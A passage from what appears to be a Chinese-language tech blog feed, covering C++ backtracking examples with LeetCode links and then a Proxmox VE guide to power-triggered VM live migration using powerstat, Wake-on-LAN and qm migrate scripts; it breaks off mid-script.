class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; result; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">combinations</span><span class="params">(<span class="type">int</span> N, <span class="type">int</span> K, <span class="type">int</span> index, <span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index == K) &#123;  <span class="comment">// 如果子集長度達到 K，則輸出當前子集</span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;&#123; &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; result.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            cout &lt;&lt; result[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;&#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 遍歷剩下的所有可能的選擇</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt;= N; i++) &#123;</span><br><span class="line">        result.<span class="built_in">push_back</span>(i);  <span class="comment">// 加入當前數字</span></span><br><span class="line">        <span class="built_in">combinations</span>(N, K, index + <span class="number">1</span>, i + <span class="number">1</span>); <span class="comment">// 前往下一層</span></span><br><span class="line">        result.<span class="built_in">pop_back</span>();  <span class="comment">// 回溯，移除當前數字</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> N = <span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> K = <span class="number">2</span>; </span><br><span class="line">    <span class="built_in">combinations</span>(N, K, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>輸出結果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123; 1 2 &#125;</span><br><span class="line">&#123; 1 3 &#125;</span><br><span class="line">&#123; 1 4 &#125;</span><br><span class="line">&#123; 2 3 &#125;</span><br><span class="line">&#123; 2 4 &#125;</span><br><span class="line">&#123; 3 4 &#125;</span><br></pre></td></tr></table></figure><p>以下透過樹狀結構來圖解查找輸出結果 (N&#x3D;4, K&#x3D;2)的遞迴過程:</p><p><code>從 1 ~ 4</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                combinations(N=4, K=2, index=0, start=1)</span><br><span class="line">                     /                                \</span><br><span class="line">combinations(N=4, K=2, index=1, start=2)       (skip 1, start at 2)</span><br><span class="line">  (選擇1)                         /                     \</span><br><span class="line">               combinations(N=4, K=2, index=2, start=3)    (skip 2)</span><br><span class="line">                 (選擇2)                     /                     \</span><br><span class="line">                   &#123;1,2&#125;           combinations(N=4, K=2, index=2, start=4)</span><br><span class="line">                                            (選擇3)           \</span><br><span class="line">                                              &#123;1,3&#125;        combinations(N=4, K=2, index=2, start=5)</span><br><span class="line">                                                                   (選擇4) </span><br><span class="line">                                                                     &#123;1,4&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>從 2 ~ 4</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">                combinations(N=4, K=2, index=0, start=2)</span><br><span class="line">                     /                                \</span><br><span class="line">combinations(N=4, K=2, index=1, start=3)       (skip 2, start at 3)</span><br><span class="line">  (選擇2)                         /                     \</span><br><span class="line">               combinations(N=4, K=2, index=2, start=4)    (skip 3)</span><br><span class="line">                 (選擇3)                     /                     \</span><br><span class="line">                   &#123;2,3&#125;           combinations(N=4, K=2, index=2, start=5)</span><br><span class="line">                                            (選擇4)             </span><br><span class="line">                                              &#123;2,4&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>從 3 ~ 4</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">                combinations(N=4, K=2, index=0, start=3)</span><br><span class="line">                     /                                \</span><br><span class="line">combinations(N=4, K=2, index=1, start=4)       (skip 3, start at 4)</span><br><span class="line">  (選擇3)                         /                     \</span><br><span class="line">               combinations(N=4, K=2, index=2, start=5)    </span><br><span class="line">                 (選擇4)                               </span><br><span class="line">                   &#123;3,4&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Palindrome-Partitioning"><a href="#Palindrome-Partitioning" class="headerlink" title="Palindrome Partitioning"></a>Palindrome Partitioning</h2><blockquote><p>將一個字串切割成為一群回文字串，每個子字串都是回文字串，列出所有切割方式</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">string input = <span class="string">&quot;aab&quot;</span>; </span><br><span class="line">vector&lt;vector&lt;string&gt;&gt; result;  </span><br><span class="line">vector&lt;string&gt; currentPartition; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 判斷子字串是否是回文</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">const</span> string&amp; s, <span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[start] != s[end]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        start++;</span><br><span class="line">        end--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Bacltracking：在字串中切割回文</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Palindrome</span><span class="params">(<span class="type">const</span> string&amp; s, <span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果切到字串末端，則儲存當前的切割結果</span></span><br><span class="line">    <span class="keyword">if</span> (start == s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        result.<span class="built_in">push_back</span>(currentPartition);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 從當前索引開始，嘗試每一個可能的子字串</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isPalindrome</span>(s, start, i)) &#123;</span><br><span class="line">            <span class="comment">// 將回文子串加入當前切割方式</span></span><br><span class="line">            currentPartition.<span class="built_in">push_back</span>(s.<span class="built_in">substr</span>(start, i - start + <span class="number">1</span>));</span><br><span class="line">            <span class="comment">// 繼續遞歸切割剩下的字串</span></span><br><span class="line">            <span class="built_in">Palindrome</span>(s, i + <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 回退，移除最後一個加入的子串</span></span><br><span class="line">            currentPartition.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">Palindrome</span>(input, <span class="number">0</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; partition : result) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;&#123; &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; p : partition) &#123;</span><br><span class="line">            cout &lt;&lt; p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;&#125;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>這裡以字串 <code>aab</code> 為例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">                    [&quot;&quot;]           # &#x27;aab&#x27;</span><br><span class="line">                     |</span><br><span class="line">                   [&quot;a&quot;]           # &#x27;ab&#x27;</span><br><span class="line">                  /     \</span><br><span class="line">           [&quot;a&quot;,&quot;a&quot;]   [&quot;aa&quot;]      # &#x27;b&#x27;</span><br><span class="line">             /             \</span><br><span class="line">[&quot;a&quot;,&quot;a&quot;,&quot;b&quot;]              [&quot;aa&quot;,&quot;b&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>首先回傳的vector 會為空，接著才是第一層</li><li>第一層就是從 <code>a</code> 開始切，視為第一個回文字串，接著遞迴處理剩下來的 <code>ab</code></li><li>除了只切出 <code>a</code> 之外，也可以切成 <code>aa</code> 也視為回文字串，接著處理剩下來的 <code>b</code></li><li>之後便是第二層，在選擇了 <code>a</code> 之後，我們再從剩下的 <code>a</code> 中切割出另一個 <code>a</code>，然後處理剩下的字串 <code>b</code></li><li>如果選擇了 <code>aa</code> 之後，只剩下 <code>b</code> 需要處理</li><li>第三層，當到達 <code>b</code> 時，因為 <code>b</code> 自身就是回文，所以它可以作為一個單獨的切割。</li></ul><blockquote><p>第一條路徑：**<code>[&quot;a&quot;, &quot;a&quot;, &quot;b&quot;]</code><strong>，切割方式為 <strong><code>&quot;a&quot; → &quot;a&quot; → &quot;b&quot;</code></strong><br>第二條路徑：</strong><code>[&quot;aa&quot;, &quot;b&quot;]</code>**，切割為 <strong><code>&quot;aa&quot; → &quot;b&quot;</code></strong></p></blockquote><h1 id="Backtracking-使用情境"><a href="#Backtracking-使用情境" class="headerlink" title="Backtracking 使用情境"></a>Backtracking 使用情境</h1><p>由於計算量龐大，因此通常是用於需要找到所有解的狀況，但缺點也是計算量龐大，可能進一步導致時間複雜度提升，<strong>通常也可以透過先前提過的 Pruning來降低搜尋次數</strong></p><h1 id="Backtracking-相關-LeetCode-題目"><a href="#Backtracking-相關-LeetCode-題目" class="headerlink" title="Backtracking 相關 LeetCode 題目"></a>Backtracking 相關 LeetCode 題目</h1><p>Medium</p><ul><li><strong><a href="https://leetcode.com/problems/letter-combinations-of-a-phone-number/description/?envType=study-plan-v2&envId=top-interview-150">17. Letter Combinations of a Phone Number</a></strong></li><li><strong><a href="https://leetcode.com/problems/combinations/description/?envType=study-plan-v2&envId=top-interview-150">77. Combinations</a></strong></li><li><strong><a href="https://leetcode.com/problems/permutations/description/?envType=study-plan-v2&envId=top-interview-150">46. Permutations</a></strong></li><li><strong><a href="https://leetcode.com/problems/combination-sum/description/?envType=study-plan-v2&envId=top-interview-150">39. Combination Sum</a></strong></li><li><strong><a href="https://leetcode.com/problems/generate-parentheses/description/?envType=study-plan-v2&envId=top-interview-150">22. Generate Parentheses</a></strong></li><li><strong><a href="https://leetcode.com/problems/word-search/description/?envType=study-plan-v2&envId=top-interview-150">79. Word Search</a></strong></li><li><strong><a href="https://leetcode.com/problems/knight-probability-in-chessboard/description/?ref=secondlife.tw">688. Knight Probability in Chessboard</a></strong></li></ul><p>Hard</p><ul><li><strong><a href="https://leetcode.com/problems/n-queens/description/">51. N-Queens</a></strong></li><li><strong><a href="https://leetcode.com/problems/n-queens-ii/description/?envType=study-plan-v2&envId=top-interview-150">52. N-Queens II</a></strong></li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://www.secondlife.tw/algorithms-backtracking/">https://www.secondlife.tw/algorithms-backtracking/</a><br>[2] <a href="https://web.ntnu.edu.tw/~algo/Backtracking.html">https://web.ntnu.edu.tw/~algo/Backtracking.html</a><br>[3] <a href="https://medium.com/@ralph-tech/%E6%BC%94%E7%AE%97%E6%B3%95%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E5%9B%9E%E6%BA%AF%E6%B3%95-backtracking-%E5%88%86%E6%94%AF%E5%AE%9A%E7%95%8C%E6%B3%95-branch-and-bound-29165391c377">https://medium.com/@ralph-tech/%E6%BC%94%E7%AE%97%E6%B3%95%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E5%9B%9E%E6%BA%AF%E6%B3%95-backtracking-%E5%88%86%E6%94%AF%E5%AE%9A%E7%95%8C%E6%B3%95-branch-and-bound-29165391c377</a><br>[4] <a href="https://wiki.csie.ncku.edu.tw/acm/course/Backtracking">https://wiki.csie.ncku.edu.tw/acm/course/Backtracking</a><br>[5] <a href="https://www.javatpoint.com/backtracking-introduction">https://www.javatpoint.com/backtracking-introduction</a><br>[6] <a href="https://willrosenbaum.com/teaching/2021s-cosc-112/notes/recursive-image/">https://willrosenbaum.com/teaching/2021s-cosc-112/notes/recursive-image/</a><br>[7] <a href="https://www.javatpoint.com/backtracking-introduction">https://www.javatpoint.com/backtracking-introduction</a><br>[8] <a href="https://ithelp.ithome.com.tw/articles/10273084?ref=secondlife.tw">https://ithelp.ithome.com.tw/articles/10273084?ref=secondlife.tw</a></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Backtracking </tag>
            
            <tag> Algorithms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基於 CPU 功耗來進行 PVE 虛擬機的 Live Migrations | PVE 系列-2</title>
      <link href="/posts/8efb2cec.html"/>
      <url>/posts/8efb2cec.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://leozzmc.github.io/posts/c5581068.html">上一篇文章</a>中我們介紹了如何在 Proxmox VE 中對虛擬機進行 Live Migrations，現在我們要加入條件來去對虛擬機進行 Migrations，由於我目前需求會是功耗，因此會需要知道在如何獲取  CPU 功耗的資訊。</p><h1 id="獲取-CPU-功耗資訊"><a href="#獲取-CPU-功耗資訊" class="headerlink" title="獲取 CPU 功耗資訊"></a>獲取 CPU 功耗資訊</h1><p>通常可以透過幾種方式來獲取 CPU 或者是其他硬體的功耗，最簡單的方式就是透過 <code>powerstat</code> 來在 Linux&#x2F;Unix 環境中查看 CPU 的功耗。 另外如果主機有 BMC和支援IPMI 的話，那就可以透過 <code>ipmitool</code> 去獲取主機的電力消耗資訊。</p><blockquote><p>題外話: 其實 Proxmox VE 本身是有支援 <a href="https://blog.jason.tools/2019/02/pve-ipmi-watchdog.html"><strong>IPMI watchdog</strong></a> 的，可以在 <code>/etc/default/pve-ha-manager</code> 裡面去取消註解，改成使用 IPMI watchdog，因為默認是使用作業系統層級的 softdog，但如果主機板沒有支援的話那就還是用默認的就好。</p></blockquote><div class="note info flat"><p>這邊提供幾行指令檢測你的主機有沒有支援 IPMI<br><code>sudo apt-get install ipmitool</code><br>檢查 BMC (Board Management Controller) 是否存在並正常運行，如果未返回資訊或顯示錯誤信息，則可能表示該伺服器不支持 IPMI<br><code>sudo ipmitool mc info </code><br>或者可以透過 dmidecode 來檢查<br><code>sudo dmidecode | grep -i ipmi</code><br>如果伺服器不返回任何 IPMI&#x2F;BMC 相關資訊，則可能是硬體不支援</p></div><p>這裡嘗試透過 <code>powerstat</code> 指令獲取資訊:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo powerstat -R</span><br></pre></td></tr></table></figure><p><img src="/img/PVE/cpu.png"></p><p>這個command 最小會去取樣60個 sample，1秒鐘取一次  CPU 消耗功耗值，最後會輸出平均消耗功耗，可以先簡易從這個結果來去寫進腳本裡去作為 migration 用的判斷條件。</p><h1 id="Migrations-場景"><a href="#Migrations-場景" class="headerlink" title="Migrations 場景"></a>Migrations 場景</h1><p>可以先簡單獲取 CPU 功耗後，接下來就是要介紹一下 migration 情境。這裡延續上一篇的雙節點架構，在節點A判斷消耗功耗大於閥值的時候，就會去進行 migration，但如果節點處於關機狀態時，會將其喚醒進行 migration。 這一點我們可以先寫個 bash 腳本來實現。</p><p><em>Before</em></p><p><img src="/img/PVE/wakup.png"></p><p><em>After</em></p><p><img src="/img/PVE/migration.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">POWER_THRESHOLD=6.0</span><br><span class="line">NODE=<span class="string">&quot;pve2&quot;</span></span><br><span class="line">VM_ID=<span class="string">&quot;100&quot;</span></span><br><span class="line">BACKUP_NODE=<span class="string">&quot;pve&quot;</span></span><br><span class="line">BACKUP_NODE_IP=<span class="string">&quot;172.25.166.68&quot;</span></span><br><span class="line">BACKUP_NODE_MAC=<span class="string">&quot;0c:9d:92:86:bb:63&quot;</span></span><br><span class="line">POWER_CONSUMPTION=$(powerstat -R 1 60 | grep -oP <span class="string">&#x27;CPU:\s+\K[0-9.]+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (( $(echo &quot;<span class="variable">$POWER_CONSUMPTION</span> &gt; <span class="variable">$POWER_THRESHOLD</span>&quot; | bc -l) )); <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Power consumption too high (<span class="variable">$POWER_CONSUMPTION</span> W) on <span class="variable">$NODE</span>. Migrating VM <span class="variable">$VM_ID</span> to <span class="variable">$BACKUP_NODE</span>...&quot;</span>    </span><br><span class="line">    wakeonlan <span class="variable">$BACKUP_NODE_MAC</span>  </span><br><span class="line">     <span class="comment"># VM Live Migration</span></span><br><span class="line">    qm migrate <span class="variable">$VM_ID</span> <span class="variable">$BACKUP_NODE</span> --online</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Complete VM <span class="variable">$VM_ID</span> migrated to  backup node <span class="variable">$BACKUP_NODE</span> (<span class="variable">$BACKUP_NODE_IP</span>) | (<span class="variable">$BACKUP_NODE_MAC</span>)...&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Power consumption is normal (<span class="variable">$POWER_CONSUMPTION</span> W) on <span class="variable">$NODE</span>.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>上面簡易的 bash 腳本，首先設定了一個較低的閥值為 6 瓦特，這是為了實驗方便，基本上就是讓節點一定會進行 migration，但我這裡其實是讓節點 <code>pve2</code>上的VM 去 migrate 到節點 <code>pve</code>。後面的 <code>POWER_CONSUMPTION=$(powerstat -R 1 60 | grep -oP &#39;CPU:\s+\K[0-9.]+&#39;)</code> 基本上就是去透過 <code>powerstat</code> 命令獲取60個取樣值下的平均CPU功耗，會花一分鐘 (這個命令的限制)，之後就是透過 <code>wakeonlan</code> 這個命令實現遠端主機的喚醒。 之後透過 <code>qm</code> 命令去進行 pve 節點的migration。 </p><h1 id="QM"><a href="#QM" class="headerlink" title="QM"></a>QM</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qm migrate</span><br></pre></td></tr></table></figure><p><strong>qm</strong> 是 <strong>QEMU&#x2F;KVM Virtual Machine Manager</strong> ，它也是 PVE 提供的實用指令工具，其中 <code>migrate</code> 選項可以讓我們將指定 VM ID 的虛擬機轉移到其他節點上，而如果 VM 正在運行，則需要添加 <code>--online</code> 參數進行動態 migration。如果對 <code>qm</code> 命令感興趣，可以參考它的 <a href="https://pve.proxmox.com/pve-docs/qm.1.html">manual</a></p><p><img src="/img/PVE/qm.png"></p><h1 id="Wake-On-LAN-WOL"><a href="#Wake-On-LAN-WOL" class="headerlink" title="Wake On LAN (WOL)"></a>Wake On LAN (WOL)</h1><blockquote><p><strong>Wake On LAN (WOL)</strong> 又稱「網路喚醒」，可以讓相同區域網路下的電腦對關機或者休眠狀態的主機發送命令使其開機，恢復成運作狀態。想要實現這功能必須先確認主機板是否支援WOL，如果支援那就需要在 UEFI&#x2F;BIOS 當中去啟用 <strong>PCI&#x2F;PCIe 喚醒功能</strong></p></blockquote><h2 id="原理介紹"><a href="#原理介紹" class="headerlink" title="原理介紹"></a>原理介紹</h2><p>在查詢到 WOL 的當下其實也很好奇為甚麼關機的電腦還能夠去收到封包去將主機喚醒? <strong>而它的祕密就在於電腦關機或休眠時還是會有微弱電力，來讓網卡或主機有最低的運作能力</strong>，這樣就可以去監聽區域網路中的其他封包，持續的去接受並檢查來自相同區域網路下的廣播資訊。</p><p>而負責喚醒節點的主機，會在區域網路中去廣播 <strong>Magic Packet</strong>，這個 Magic Packet 中通常會先出現 <strong>連續6個FF</strong>: <code>FF FF FF FF FF FF</code> 在這之後會帶出 Mac Address，有時候也包含 4 到 6 bytes的密碼。 </p><p>那這個 Magic Packet 會在 LAN 中被廣播，<strong>一旦處於休眠關機狀態的主機透過具有最低限度運作能力的網卡去解析內容後，發現 Magic Packet 中攜帶的資訊與本地主機匹配，就會啟動開機程式。</strong>  這也是為甚麼上面的 bash 腳本中，在　<code>wakeonlan</code> 後面要加上 MAC Address 了</p><h2 id="前往-BIOS-啟用-WOL"><a href="#前往-BIOS-啟用-WOL" class="headerlink" title="前往 BIOS 啟用 WOL"></a>前往 BIOS 啟用 WOL</h2><p>這裡個別在兩個節點分別進入 BIOS 來去啟用，啟用後就保存變更然後重啟。</p><p><img src="/img/PVE/wol1.jpg"></p><p><img src="/img/PVE/wol2.jpg"></p><h2 id="指令測試"><a href="#指令測試" class="headerlink" title="指令測試"></a>指令測試</h2><p>我這裡先把 nodeB 關機，想從nodeA去喚醒看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wakeonlan 04:42:1a:e7:5a:a0</span><br></pre></td></tr></table></figure><p><img src="/img/PVE/wol3.png"></p><p>也從 history 當中看到節點二從關機狀態成功開機。</p><p><img src="/img/PVE/wol4.png"></p><h1 id="實驗過程"><a href="#實驗過程" class="headerlink" title="實驗過程"></a>實驗過程</h1><blockquote><p>但從剛才的指令測試也發現其實等待開機時間也需要納入考量，因此我們可以將腳本改成下面這樣</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">POWER_THRESHOLD=6.0</span><br><span class="line">NODE=<span class="string">&quot;pve2&quot;</span></span><br><span class="line">VM_ID=<span class="string">&quot;100&quot;</span></span><br><span class="line">BACKUP_NODE=<span class="string">&quot;pve&quot;</span></span><br><span class="line">BACKUP_NODE_IP=<span class="string">&quot;172.25.166.68&quot;</span></span><br><span class="line">BACKUP_NODE_MAC=<span class="string">&quot;0c:9d:92:86:bb:63&quot;</span></span><br><span class="line">MAX_RETRIES=12 </span><br><span class="line">SLEEP_INTERVAL=10</span><br><span class="line"></span><br><span class="line">POWER_CONSUMPTION=$(powerstat -R 1 60 | grep -oP <span class="string">&#x27;CPU:\s+\K[0-9.]+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (( $(echo &quot;<span class="variable">$POWER_CONSUMPTION</span> &gt; <span class="variable">$POWER_THRESHOLD</span>&quot; | bc -l) )); <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Power consumption too high (<span class="variable">$POWER_CONSUMPTION</span> W) on <span class="variable">$NODE</span>. Migrating VM <span class="variable">$VM_ID</span> to <span class="variable">$BACKUP_NODE</span>...&quot;</span></span><br><span class="line"></span><br><span class="line">    wakeonlan <span class="variable">$BACKUP_NODE_MAC</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Waiting for <span class="variable">$BACKUP_NODE</span> (<span class="variable">$BACKUP_NODE_IP</span>) to be reachable...&quot;</span></span><br><span class="line">    RETRY_COUNT=0</span><br><span class="line">    <span class="keyword">while</span> ! ping -c 1 <span class="variable">$BACKUP_NODE_IP</span> &amp;&gt; /dev/null; <span class="keyword">do</span></span><br><span class="line">        RETRY_COUNT=$((RETRY_COUNT + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$RETRY_COUNT</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$MAX_RETRIES</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Error: <span class="variable">$BACKUP_NODE</span> did not respond after <span class="subst">$((MAX_RETRIES * SLEEP_INTERVAL)</span>) seconds. Exiting.&quot;</span></span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Waiting for <span class="variable">$BACKUP_NODE</span> to come online... (<span class="variable">$RETRY_COUNT</span>/<span class="variable">$MAX_RETRIES</span>)&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> <span class="variable">$SLEEP_INTERVAL</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Backup node <span class="variable">$BACKUP_NODE</span> is online. Starting 